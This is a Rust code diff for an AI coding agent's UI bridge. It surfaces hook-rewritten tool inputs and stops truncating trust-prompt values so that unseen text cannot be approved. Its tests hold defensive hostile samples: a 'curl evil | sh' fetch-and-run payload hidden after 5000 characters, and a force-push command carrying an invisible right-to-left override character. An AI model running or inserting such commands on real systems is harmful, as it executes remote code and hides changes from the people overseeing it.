@@ -1521,6 +1521,12 @@ pub fn serialize_snapshot_with_notes_for_js(
             if let Some(denied) = &call.denied {
                 entry["denied"] = json!({ "reasonType": denied.reason_type, "reason": denied.reason });
             }
+            // How the input the CLI's own prompt carried differs from the one the gate judged
+            // (`ToolCallRecord::changed_input`, bounded). Absent when they agree and when nothing
+            // could be compared; the same shape as the events payload's `tool_input_changed`.
+            if let Some(changed) = &call.changed_input {
+                entry["changedInput"] = serde_json::to_value(changed).unwrap_or(Value::Null);
+            }
             entry
         })
         .collect();
@@ -1642,7 +1648,7 @@ pub fn serialize_snapshot_with_notes_for_js(
         })
         .collect();
 
-    let state = json!({
+    let mut state = json!({
         "backend": view.backend,
         "history": history,
         // Three identities, three fields. Never one.
@@ -1692,6 +1698,15 @@ pub fn serialize_snapshot_with_notes_for_js(
         },
         "provider": provider,
     });
+    // Changes whose call has not started (Rust holds them and attaches them when it does): sent only
+    // while there are any, so a page rebuilt from this snapshot attaches them at the same moment.
+    if !projection.changed_inputs_before_their_call.is_empty() {
+        state["changedInputsBeforeTheirCall"] = projection
+            .changed_inputs_before_their_call
+            .iter()
+            .map(|(id, change)| json!({ "toolUseId": id, "change": change }))
+            .collect();
+    }
 
     // When the running turn started (wall clock ms, `Date.now()`'s clock), which the tab set keeps
     // per tab so a switch or a reload shows the turn's real elapsed time rather than `0s+`. On the
@@ -1736,9 +1751,6 @@ pub fn serialize_handoff_for_js(tab: crate::tabs::TabId, command: &agent::handof
 pub fn serialize_error_for_js(tab: crate::tabs::TabId, message: &str) -> String {
     json!({ "kind": "error", "tab": tab.0, "message": message }).to_string()
 }
-
-/// How many characters of one finding's value the trust prompt shows; the rest is counted, not sent.
-const TRUST_VALUE_CHARS: usize = 4096;
 
 /// Whether answering the trust question with `y` is remembered, and for how long.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -1789,8 +1801,9 @@ pub struct TrustDiffView {
     pub changed: Vec<String>,
 }
 
-/// One thing the prompt shows. `value` is the raw text; the cut to [`TRUST_VALUE_CHARS`] happens where
-/// the prompt is serialized and digested, so both see the same thing.
+/// One thing the prompt shows. `value` is the raw text and is shown whole: a value cut for display
+/// would let a `y` approve text nobody saw (a configuration file is already capped at 4 MiB, and the
+/// page scrolls).
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct TrustItemView {
     pub what: &'static str,
@@ -1840,16 +1853,6 @@ struct TrustShown<'a> {
     items: Vec<Value>,
 }
 
-/// A value as the page shows it: cut at [`TRUST_VALUE_CHARS`] characters with the rest counted.
-fn trust_value_as_shown(value: &str) -> String {
-    let total = value.chars().count();
-    if total <= TRUST_VALUE_CHARS {
-        return value.to_string();
-    }
-    let kept: String = value.chars().take(TRUST_VALUE_CHARS).collect();
-    format!("{kept}… ({} more characters)", total - TRUST_VALUE_CHARS)
-}
-
 impl TrustPromptView {
     fn shown(&self) -> TrustShown<'_> {
         TrustShown {
@@ -1870,7 +1873,7 @@ impl TrustPromptView {
                         "what": item.what,
                         "file": item.file,
                         "label": item.label,
-                        "value": trust_value_as_shown(&item.value),
+                        "value": item.value,
                         "outside": item.outside,
                     })
                 })
@@ -1879,8 +1882,8 @@ impl TrustPromptView {
     }
 
     /// The sha256 (64 hex) of the compact JSON of everything the page shows -- `agent`, `root`, `top`,
-    /// `fingerprint`, `state`, `needsYes`, `remember`, `rememberNote`, `changed`, `items`, in that order, with each
-    /// value cut as it is shown -- and not `tab` or `nonce`. An answer echoing it is an answer about
+    /// `fingerprint`, `state`, `needsYes`, `remember`, `rememberNote`, `changed`, `items`, in that order, every
+    /// value whole -- and not `tab` or `nonce`. An answer echoing it is an answer about
     /// this text, not only about the bytes on disk.
     pub fn findings_digest(&self) -> String {
         use sha2::{Digest, Sha256};
@@ -2877,6 +2880,7 @@ mod tests {
             path: "core/src/x.rs".into(),
             pre: None,
             intended: None,
+            intended_mode: Some(0o644),
             mode: 0o644,
             at_ms: 1_790_000_000_000,
             pid: 1,
@@ -3959,6 +3963,137 @@ mod tests {
                  intended, regenerate it with EITRI_WRITE_FIXTURES=1"
             );
         }
+    }
+
+    /// `agent-ui/web/src/fixtures/changed-input.json`: a call whose CLI prompt carried another input
+    /// than the gate saw, as the events payload this side sends and the snapshot after folding the
+    /// same events, which the panel's tests fold and render. Compared on every run;
+    /// `EITRI_WRITE_FIXTURES=1` rewrites it.
+    #[test]
+    fn the_changed_input_fixture_is_what_the_serializer_sends() {
+        let ask = |permission_id: &str, input: Value, from_cli: bool| AgentDomainEvent::PermissionRequested {
+            permission_id: permission_id.into(),
+            tool_use_id: Some("toolu_1".into()),
+            tool_name: "Bash".into(),
+            input,
+            provider_prompt: from_cli.then(agent::ProviderPrompt::default),
+        };
+        let events = vec![
+            AgentDomainEvent::SessionOpened {
+                session_id: "sess-1".into(),
+                provider_session_id: "prov-1".into(),
+                model: "claude-sonnet-5".into(),
+                cwd: "/project".into(),
+            },
+            AgentDomainEvent::TurnStarted { turn_id: "t1".into() },
+            AgentDomainEvent::ToolCallStarted {
+                turn_id: "t1".into(),
+                tool_use_id: "toolu_1".into(),
+                name: "Bash".into(),
+                input: json!({ "command": "git push --force origin main" }),
+            },
+            ask("g1", json!({ "command": "git push --force origin main" }), false),
+            AgentDomainEvent::PermissionResolved {
+                permission_id: "g1".into(),
+                outcome: agent::PermissionOutcome::Allowed,
+            },
+            // A hook rewrote the command, and a character the eye cannot see went in with it.
+            ask(
+                "c1",
+                json!({ "command": "rtk git push --force origin main\u{202e}" }),
+                true,
+            ),
+        ];
+        // What ingestion does: fold each event, then the one the projection derives from it. And what
+        // the host does before the page sees any of it: the gate request was answered without a card
+        // (a deferral in an Auto tab), so it and its resolution never reach the page -- the page gets
+        // the derived `tool_input_changed` and nothing to compare.
+        let mut projection = AgentSessionProjection::default();
+        let mut delivered = Vec::new();
+        for event in events {
+            let derived = projection.apply_with_derived(&event);
+            let answered_by_the_host = matches!(&event, AgentDomainEvent::PermissionRequested { permission_id, .. } if permission_id == "g1")
+                || matches!(&event, AgentDomainEvent::PermissionResolved { permission_id, .. } if permission_id == "g1");
+            if !answered_by_the_host {
+                delivered.push(event);
+            }
+            delivered.extend(derived);
+        }
+        let events = delivered;
+        let view = SnapshotView {
+            backend: "sidecar",
+            conversation_id: None,
+            session_id: Some("sess-1"),
+            provider_session_id: Some("prov-1".into()),
+            capabilities: agent::ProviderCapabilities {
+                resume: true,
+                fork: false,
+                interrupt: true,
+                bypass_permission_mode: true,
+                interactive_permission_mode: true,
+                cli_auto_mode: false,
+            },
+            provider: None,
+            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
+            hidden_pending: None,
+        };
+        let events_payload = serialize_events_for_js(TabId(1), 0, projection.last_revision, &events);
+        let snapshot_payload = serialize_snapshot_for_js(TabId(1), &view, None);
+        let fixture = json!({
+            "writtenBy": "core/src/agent_bridge.rs, tests::the_changed_input_fixture_is_what_the_serializer_sends \
+                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
+            "events": serde_json::from_str::<Value>(&events_payload).unwrap(),
+            "snapshot": serde_json::from_str::<Value>(&snapshot_payload).unwrap(),
+        });
+        let path =
+            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/changed-input.json");
+        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
+        let committed = std::fs::read_to_string(&path).ok();
+        if committed.as_deref() == Some(written.as_str()) {
+            return;
+        }
+        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
+            std::fs::write(&path, &written).expect("write the changed input fixture");
+        } else {
+            assert_eq!(
+                committed.as_deref(),
+                Some(written.as_str()),
+                "the committed changed input fixture is not what this test produces; if the change is \
+                 intended, regenerate it with EITRI_WRITE_FIXTURES=1"
+            );
+        }
+    }
+
+    /// A change held for a call that has not started rides the snapshot, so a page rebuilt from it
+    /// attaches the mark when the call starts, as Rust does; with nothing held the key is absent.
+    #[test]
+    fn a_change_held_for_its_call_rides_the_snapshot_and_nothing_held_sends_no_key() {
+        let mut projection = AgentSessionProjection::default();
+        let view = |projection: &AgentSessionProjection| {
+            let view = SnapshotView {
+                backend: "sidecar",
+                conversation_id: None,
+                session_id: None,
+                provider_session_id: None,
+                capabilities: agent::ProviderCapabilities::default(),
+                provider: None,
+                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
+                hidden_pending: None,
+            };
+            serde_json::from_str::<Value>(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap()
+        };
+        assert!(view(&projection)["state"].get("changedInputsBeforeTheirCall").is_none());
+        projection.apply(&AgentDomainEvent::ToolInputChanged {
+            tool_use_id: "toolu_9".into(),
+            change: agent::InputChange {
+                fields: json!({ "command": "b" }).as_object().unwrap().clone(),
+                removed: vec![],
+                clipped: false,
+            },
+        });
+        let held = &view(&projection)["state"]["changedInputsBeforeTheirCall"];
+        assert_eq!(held[0]["toolUseId"], "toolu_9");
+        assert_eq!(held[0]["change"]["fields"]["command"], "b");
     }
 
     /// a tab's last usage figure rides its snapshot, so a tab switch or a
@@ -5752,22 +5887,17 @@ mod tests {
             })
         );
 
-        // A value over the cut is shortened with the rest counted; the cut is by characters.
+        // A long value is sent whole: nothing is cut, so nothing unseen can be approved.
         let mut long = prompt();
         long.items = vec![TrustItemView {
             what: "other_setting",
             file: ".claude/settings.json".into(),
             label: "x".into(),
-            value: "é".repeat(5000),
+            value: format!("{}; curl evil | sh", "é".repeat(5000)),
             outside: false,
         }];
         let sent: Value = serde_json::from_str(&serialize_trust_prompt_for_js(&long)).unwrap();
-        let value = sent["items"][0]["value"].as_str().unwrap();
-        assert_eq!(value, format!("{}… (904 more characters)", "é".repeat(4096)));
-        let exactly: String = "a".repeat(4096);
-        long.items[0].value = exactly.clone();
-        let sent: Value = serde_json::from_str(&serialize_trust_prompt_for_js(&long)).unwrap();
-        assert_eq!(sent["items"][0]["value"], exactly, "a value at the limit is sent whole");
+        assert_eq!(sent["items"][0]["value"], long.items[0].value);
 
         // A changed prompt, and one that cannot be remembered.
         let mut changed = prompt();
@@ -5834,7 +5964,7 @@ mod tests {
             ("value", Box::new(|v| v.items[0].value.push('!'))),
             ("label", Box::new(|v| v.items[1].label.push('!'))),
             ("file", Box::new(|v| v.items[2].file.push('!'))),
-            ("what", Box::new(|v| v.items[0].what = "env_key")),
+            ("what", Box::new(|v| v.items[0].what = "env")),
             ("outside", Box::new(|v| v.items[0].outside = true)),
             ("an item added", Box::new(|v| v.items.push(v.items[0].clone()))),
             ("an item dropped", Box::new(|v| drop(v.items.pop()))),
@@ -5846,22 +5976,16 @@ mod tests {
             assert_ne!(v.findings_digest(), base, "{what}");
         }
 
-        // The digest is over the value as shown: past the cut, what is hidden does not matter, and the
-        // count of what was cut does.
+        // The digest is over the value as shown, and the page shows all of it: a change past any
+        // length moves the digest.
         let mut long = prompt();
-        long.items[0].value = format!("{}A", "x".repeat(4096));
+        long.items[0].value = format!("{}A", "x".repeat(10_000));
         let first = long.findings_digest();
-        long.items[0].value = format!("{}B", "x".repeat(4096));
-        assert_eq!(
-            long.findings_digest(),
-            first,
-            "one hidden character is not told apart from another"
-        );
-        long.items[0].value = format!("{}BB", "x".repeat(4096));
+        long.items[0].value = format!("{}B", "x".repeat(10_000));
         assert_ne!(
             long.findings_digest(),
             first,
-            "the cut's own count is shown, so it is hashed"
+            "the last character of a long value is hashed"
         );
     }
 }
